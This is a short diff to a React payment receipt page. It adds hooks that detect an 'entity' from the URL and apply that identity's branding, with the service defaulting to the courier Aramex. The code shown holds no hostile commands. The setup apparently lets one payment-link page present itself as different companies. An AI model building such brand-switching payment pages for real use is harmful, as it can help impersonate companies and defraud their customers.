@@ -5,11 +5,17 @@ import { getServiceBranding } from "@/lib/serviceLogos";
 import DynamicPaymentLayout from "@/components/DynamicPaymentLayout";
 import { useLink } from "@/hooks/useSupabase";
 import { CheckCircle, Download, ArrowLeft, CreditCard, Calendar, Hash } from "lucide-react";
+import { detectEntityFromURL, getEntityIdentity } from "@/lib/dynamicIdentity";
+import { useAutoApplyIdentity } from "@/hooks/useAutoApplyIdentity";
+import { useDynamicIdentity } from "@/components/DynamicIdentityProvider";
 
 const PaymentReceiptPage = () => {
   const { id } = useParams();
   const navigate = useNavigate();
   const { data: linkData } = useLink(id);
+
+  useAutoApplyIdentity();
+  const { identity: dynamicIdentity } = useDynamicIdentity();
   
   const customerInfo = JSON.parse(sessionStorage.getItem('customerInfo') || '{}');
   const serviceKey = linkData?.payload?.service_key || customerInfo.service || 'aramex';
